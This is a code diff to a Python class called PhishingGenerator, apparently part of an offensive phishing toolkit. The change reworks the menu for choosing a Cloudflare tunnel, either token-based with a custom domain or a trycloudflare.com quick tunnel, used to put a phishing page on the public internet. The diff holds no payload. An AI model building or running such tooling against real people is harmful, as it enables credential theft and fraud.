@@ -843,12 +843,18 @@ class PhishingGenerator:
                 break
             elif c == "3":
                 self.tunnel_type = TUNNEL_CLOUDFLARE
-                cf_choice = console.input(f"\n[yellow][[?]] {'Use existing token?' if self.cf_token else 'Token available?'} (y=token / n=quick tunnel) [y/n]: [/]").strip().lower()
-                if cf_choice != 'y':
-                    # Clear token to force quick tunnel
+                has_token = bool(self.cf_token)
+                prompt = 'Use existing token?' if has_token else 'Have a Cloudflare token?'
+                cf_choice = console.input(f"\n[yellow][[?]] {prompt} (y=token / n=quick tunnel) [y/n]: [/]").strip().lower()
+                if cf_choice == 'y':
+                    if not has_token:
+                        self.cf_token = console.input("\n[yellow]Enter Cloudflare Tunnel token: [/]").strip()
+                        self._save_session_key('cf_token', self.cf_token)
+                    console.print("[dim]→ Using token-based tunnel (custom domain)[/]")
+                else:
                     self.cf_token = None
                     self._clear_session_keys(['cf_token', 'cf_url'])
-                    console.print("[dim]→ Using Quick Tunnel (trycloudflare.com, no token needed)[/]")
+                    console.print("[dim]→ Using Quick Tunnel (trycloudflare.com)[/]")
                 break
         self._save_session_key('tunnel_type', self.tunnel_type)
 
